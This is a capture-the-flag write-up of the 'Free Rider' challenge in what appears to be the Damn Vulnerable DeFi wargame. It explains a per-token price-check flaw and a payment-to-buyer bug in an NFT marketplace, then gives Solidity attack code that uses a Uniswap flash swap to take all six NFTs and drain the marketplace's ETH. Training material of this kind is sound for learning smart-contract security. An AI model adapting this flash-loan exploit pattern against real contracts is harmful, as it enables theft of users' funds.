# Solving "The Free Rider" 🕵️‍♂️

## The Challenge That Made Me Smile

This one was beautifully crafted - a clean exploit hiding behind some tangled logic. Walking away from this challenge with a grin on my face!

## The Hunt: How I cracked this Puzzle

### Step 1: Finding the perfect target

The first mission was identifying where to strike. After some reconnaissance, `FreeRiderNFTMarketplace::buyMany` emerged as the prime candidate to attack at.

### Step 2: Uncovering the Beautiful Bug

Diving deep into this function revealed some fascinating flaws:

**The Price Check Illusion:** The function demands a minimum of `15 ether` to proceed - that's the price of a single NFT. But here's the kicker: it only validates against `msg.value` for each **tokenId**. Sent `15 ETH` instead of the expected 90 ETH for 6 NFTs and The function happily obliged.

**The Payment Redirect Magic:** When the function transfers NFTs, it sends payment to the _new owner_ instead of the original seller. It's like the marketplace forgot who it was supposed to pay!

```javascript
    // transfer from seller to buyer
    DamnValuableNFT _token = token; // cache for gas savings
    _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

    // pay seller using cached token
    payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
```

### The 15 ETH Problem

Here's where things got spicy. Even with this vulnerability, I still needed `15 ETH` to trigger the exploit. My measly `0.1 ETH` starting balance wasn't going to cut it.

But wait - there's money sitting in that `UniswapPair V2` contract, just waiting to be borrowed.

### The flash swap: Eureke moment

I initially overlooked the `data` parameter in `UniswapV2Pair::swap`, but then this line caught my eye:

```javascript
if (data.length > 0)
  IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);
```

Boom! **Flash swaps** - Uniswap's way of letting you borrow first, pay later. This was my ticket.

## Crafting the perfect Heist

### Building the Attack Contract

First, I needed a contract that could handle NFT transfers (implementing `IERC721Receiver::onERC721Received`) - can't have the transaction reverting when it tries to send me those 6 pricely NFTs.

### The Flash swap attack orchestration

```javascript
function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
    require(msg.sender == address(i_pair), "Incorrect caller");
    require(sender == address(this), "Callee is not the this contract");
    (uint256 borrowed, ) = abi.decode(data, (uint256, string));
    require(amount0 == borrowed, "Borrowed amount mismatch");
    require(amount1 == 0, "Other token not borrowed");

    // Convert WETH to ETH - get liquidity
    i_weth.withdraw(borrowed);

    // Set up our NFTs list
    uint256[] memory ids = new uint256[](6);
    for(uint i = 0; i < 6; i++){
        ids[i] = i;
    }
    // Execute the heist
    i_marketPlace.buyMany{value: borrowed}(ids);

    // Pay back the loan with extra interest
    i_weth.deposit{value: 16 ether}();
    i_weth.transfer(address(i_pair), 16 ether);
}
```

### Summary of The attack flow :

- **The Swap:** Borrow `15 ETH` worth of `WETH` from `Uniswap`
- **The Conversion:** Unwrap that WETH into ETH
- **The Strike:** Call `buyMany` with our borrowed funds
- **The Magic:** Watch as all `6 NFTs` flow to our contract while draining `75 ETH` from the marketplace
- **The Payback:** Return `16 ETH` to `Uniswap` (the extra covers fees)

### The Main Event

```javascript
function attack() external {
    bytes memory data = abi.encode(15 ether, "buy nft");
    i_pair.swap(15 ether, 0, address(this), data);

    // Send all the drained ETH to our player
    (bool success, ) = i_player.call{value: address(this).balance}("");
    require(success, "ETH transfer failed");

    // And don't forget the NFTs!
    for(uint256 i = 0; i < 6; i++){
        i_token.transferFrom(address(this), i_player, i);
    }
}
```

### Claiming the Bounty

```javascript
bytes memory data = abi.encode(player);
for(uint i = 0; i < AMOUNT_OF_NFTS; i++){
    nft.safeTransferFrom(player, address(recoveryManager), i, data);
}
```

## The victory

Mission accomplished! Not only did I almost drain the marketplace, but also walked away with the bounty reward. The player's balance skyrocketed to over `45 ETH`.

This challenge perfectly demonstrated **how a single logical flaw can cascade into a complete system compromise**. The marketplace's confusion about who to pay, combined with Uniswap's flash swap capabilities, perfectly orchestrates this elegant exploit.
